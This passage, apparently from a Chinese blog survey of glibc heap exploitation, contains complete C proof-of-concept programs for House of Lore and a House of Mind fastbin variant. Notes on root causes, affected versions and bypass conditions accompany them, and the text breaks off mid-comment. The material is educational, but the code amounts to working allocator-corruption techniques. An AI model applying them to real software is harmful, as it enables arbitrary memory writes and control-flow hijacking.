class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake free-list on the stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span></span><br><span class="line">          <span class="string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="type">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing dummy chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code>、<code>edit after free</code></p>
<h3 id="适用范围-6"><a href="#适用范围-6" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>需要泄露或已知地址</li>
</ul>
<h3 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h3><p>控制 <code>smallbin</code> 的 <code>bk</code> 指针，示例如下：</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C</code>，其中 <code>chunk B</code> 大小位于 <code>smallbin</code></li>
<li>释放 <code>B</code>，申请更大的 <code>chunk D</code>，使得 <code>B</code> 进入 <code>smallbin</code></li>
<li>写 <code>A</code>，溢出修改 <code>B</code> 的 <code>bk</code>，指向地址 <code>X</code>，这里有 <code>fake chunk</code></li>
<li>布置 <code>X-&gt;fd == &amp;B</code></li>
<li>分配两次后即可取出位于 <code>X</code> 地址处的 <code>fake chunk</code></li>
</ul>
<h3 id="相关技巧-6"><a href="#相关技巧-6" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>在引入了 <code>tcache stash unlink</code> 的时候，需要注意绕过：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>要么使其满足 <code>tc_victim = last (bin)) == bin</code>、要么使其满足：<code>tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count</code>。否则可能会因为非法内存访问使得程序 <code>down</code> 掉。</p>
<p>实际上，这个技巧用得不是很多，因为在同等条件下，更偏向于利用 <code>fastbin/tcachebin</code>。</p>
<h3 id="利用效果-6"><a href="#利用效果-6" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址分配</li>
<li>任意地址读写</li>
</ul>
<h2 id="house-of-mind"><a href="#house-of-mind" class="headerlink" title="house of mind"></a>house of mind</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">House of Mind - Fastbin Variant</span></span><br><span class="line"><span class="comment">==========================</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack is similar to the original &#x27;House of Mind&#x27; in that it uses</span></span><br><span class="line"><span class="comment">a fake non-main arena in order to write to a new location. This</span></span><br><span class="line"><span class="comment">uses the fastbin for a WRITE-WHERE primitive in the &#x27;fastbin&#x27;</span></span><br><span class="line"><span class="comment">variant of the original attack though. The original write for this</span></span><br><span class="line"><span class="comment">can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">By being able to allocate an arbitrary amount of chunks, a single byte</span></span><br><span class="line"><span class="comment">overwrite on a chunk size and a memory leak, we can control a super</span></span><br><span class="line"><span class="comment">powerful primitive. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This could be used in order to write a freed pointer to an arbitrary</span></span><br><span class="line"><span class="comment">location (which seems more useful). Or, this could be used as a</span></span><br><span class="line"><span class="comment">write-large-value-WHERE primitive (similar to unsortedbin attack). </span></span><br><span class="line"><span class="comment"> Both are interesting in their own right though but the first</span></span><br><span class="line"><span class="comment">option is the most powerful primitive, given the right setting.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Malloc chunks have a specified size and this size information</span></span><br><span class="line"><span class="comment">special metadata properties (prev_inuse, mmap chunk and non-main arena). </span></span><br><span class="line"><span class="comment">The usage of non-main arenas is the focus of this exploit. For more information </span></span><br><span class="line"><span class="comment">on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">First, we need to understand HOW the non-main arena is known from a chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This the &#x27;heap_info&#x27; struct: </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">struct _heap_info</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  mstate ar_ptr;           // Arena for this heap. &lt;--- Malloc State pointer</span></span><br><span class="line"><span class="comment">  struct _heap_info *prev; // Previous heap.</span></span><br><span class="line"><span class="comment">  size_t size;            // Current size in bytes.</span></span><br><span class="line"><span class="comment">  size_t mprotect_size;   // Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; // Proper alignment</span></span><br><span class="line"><span class="comment">&#125; heap_info; </span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The important thing to note is that the &#x27;malloc_state&#x27; within</span></span><br><span class="line"><span class="comment">an arena is grabbed from the ar_ptr, which is the FIRST entry </span></span><br><span class="line"><span class="comment">of this. Malloc_state == mstate == arena </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The main arena has a special pointer. However, non-main arenas (mstate)</span></span><br><span class="line"><span class="comment">are at the beginning of a heap section. They are grabbed with the </span></span><br><span class="line"><span class="comment">following code below, where the user controls the &#x27;ptr&#x27; in &#x27;arena_for_chunk&#x27;:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="comment">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="comment">#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This macro takes the &#x27;ptr&#x27; and subtracts a large value because the </span></span><br><span class="line"><span class="comment">&#x27;heap_info&#x27; should be at the beginning of this heap section. Then, </span></span><br><span class="line"><span class="comment">using this, it can find the &#x27;arena&#x27; to use. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The idea behind the attack is to use a fake arena to write pointers </span></span><br><span class="line"><span class="comment">to locations where they should not go but abusing the &#x27;arena_for_chunk&#x27; </span></span><br><span class="line"><span class="comment">functionality when freeing a fastbin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This POC does the following things: </span></span><br><span class="line"><span class="comment">- Finds a valid arena location for a non-main arena.</span></span><br><span class="line"><span class="comment">- Allocates enough heap chunks to get to the non-main arena location where </span></span><br><span class="line"><span class="comment">  we can control the values of the arena data. </span></span><br><span class="line"><span class="comment">- Creates a fake &#x27;heap_info&#x27; in order to specify the &#x27;ar_ptr&#x27; to be used as the arena later.</span></span><br><span class="line"><span class="comment">- Using this fake arena (ar_ptr), we can use the fastbin to write</span></span><br><span class="line"><span class="comment">  to an unexpected location of the &#x27;ar_ptr&#x27; with a heap pointer. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requirements: </span></span><br><span class="line"><span class="comment">- A heap leak in order to know where the fake &#x27;heap_info&#x27; is located at.</span></span><br><span class="line"><span class="comment">	- Could be possible to avoid with special spraying techniques</span></span><br><span class="line"><span class="comment">- An unlimited amount of allocations</span></span><br><span class="line"><span class="comment">- A single byte overflow on the size of a chunk</span></span><br><span class="line"><span class="comment">	- NEEDS to be possible to put into the fastbin. </span></span><br><span class="line"><span class="comment">	- So, either NO tcache or the tcache needs to be filled. </span></span><br><span class="line"><span class="comment">- The location of the malloc state(ar_ptr) needs to have a value larger</span></span><br><span class="line"><span class="comment">  than the fastbin size being freed at malloc_state.system_mem otherwise</span></span><br><span class="line"><span class="comment">  the chunk will be assumed to be invalid.</span></span><br><span class="line"><span class="comment">	- This can be manually inserted or CAREFULLY done by lining up</span></span><br><span class="line"><span class="comment">	  values in a proper way. </span></span><br><span class="line"><span class="comment">- The NEXT chunk, from the one that is being freed, must be a valid size</span></span><br><span class="line"><span class="comment">(again, greater than 0x20 and less than malloc_state.system_mem)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Random perks:</span></span><br><span class="line"><span class="comment">- Can be done MULTIPLE times at the location, with different sized fastbin</span></span><br><span class="line"><span class="comment">  chunks. </span></span><br><span class="line"><span class="comment">- Does not brick malloc, unlike the unsorted bin attack. </span></span><br><span class="line"><span class="comment">- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">Written up by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;House of Mind - Fastbin Variant\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;==================================&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The goal of this technique is to create a fake arena\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;at an offset of HEAP_MAX_SIZE\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Then, we write to the fastbins when the chunk is freed\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This creates a somewhat constrained WRITE-WHERE primitive\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Values for the allocation information.	</span></span><br><span class="line">	<span class="type">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="type">int</span> MAX_SIZE = (<span class="number">128</span>*<span class="number">1024</span>) - <span class="number">0x100</span>; <span class="comment">// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Find initial location of the heap\n&quot;</span>);</span><br><span class="line">	<span class="comment">// The target location of our attack and the fake arena to use</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); </span><br><span class="line">	<span class="type">uint8_t</span>* target_loc = fake_arena + <span class="number">0x30</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* target_chunk = (<span class="type">uint8_t</span>*) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Prepare a valid &#x27;malloc_state&#x27; (arena) &#x27;system_mem&#x27; </span></span><br><span class="line"><span class="comment">	to store a fastbin. This is important because the size</span></span><br><span class="line"><span class="comment">	of a chunk is validated for being too small or too large</span></span><br><span class="line"><span class="comment">	via the &#x27;system_mem&#x27; of the &#x27;malloc_state&#x27;. This just needs</span></span><br><span class="line"><span class="comment">	to be a value larger than our fastbin chunk.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set &#x27;system_mem&#x27; (offset 0x888) for fake arena\n&quot;</span>);</span><br><span class="line">	fake_arena[<span class="number">0x888</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x889</span>] = <span class="number">0xFF</span>; </span><br><span class="line">	fake_arena[<span class="number">0x88a</span>] = <span class="number">0xFF</span>; </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Memory Address for overwrite: %p\n&quot;</span>, target_loc);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Must set data at HEAP_MAX_SIZE (0x%x) offset\n&quot;</span>, HEAP_MAX_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Calculate the location of our fake arena</span></span><br><span class="line">	<span class="type">uint64_t</span> new_arena_value = (((<span class="type">uint64_t</span>) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fake_heap_info = (<span class="type">uint64_t</span>*) new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake Heap Info struct location: %p\n&quot;</span>, fake_heap_info);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate until we reach a MAX_HEAP_SIZE offset\n&quot;</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	The fake arena must be at a particular offset on the heap.</span></span><br><span class="line"><span class="comment">	So, we allocate a bunch of chunks until our next chunk</span></span><br><span class="line"><span class="comment">	will be in the arena. This value was calculated above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span>((<span class="type">long</span> <span class="type">long</span>)user_mem &lt; new_arena_value)&#123;</span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this later to trigger craziness</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create fastbin sized chunk to be victim of attack\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// Size of 0x60</span></span><br><span class="line">	<span class="type">uint64_t</span>* chunk_ptr = fastbin_chunk - <span class="number">2</span>; <span class="comment">// Point to chunk instead of mem</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fastbin Chunk to overwrite: %p\n&quot;</span>, fastbin_chunk);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the TCache so that the fastbin will be used\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Fill the tcache to make the fastbin to be used later. </span></span><br><span class="line">	<span class="type">uint64_t</span>* tcache_chunks[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)&#123;</span><br><span class="line">		tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)&#123;</span><br><span class="line">		<span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Create a FAKE malloc_state pointer for the heap_state</span></span><br><span class="line"><span class="comment">	This is the &#x27;ar_ptr&#x27; of the &#x27;heap_info&#x27; struct shown above. </span></span><br><span class="line"><span class="comment">	This is the first entry in the &#x27;heap_info&#x27; struct at offset 0x0</span></span><br><span class="line"><span class="comment">	 at the heap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We set this to the location where we want to write a value to.</span></span><br><span class="line"><span class="comment">	The location that gets written to depends on the fastbin chunk</span></span><br><span class="line"><span class="comment">	size being freed. This will be between an offset of 0x8 and 0x40</span></span><br><span class="line"><span class="comment">	bytes. For instance, a chunk with a size of 0x20 would be in the</span></span><br><span class="line"><span class="comment">	0th index of fastbinsY struct. When this is written to, we will</span></span><br><span class="line"><span class="comment">	write to an 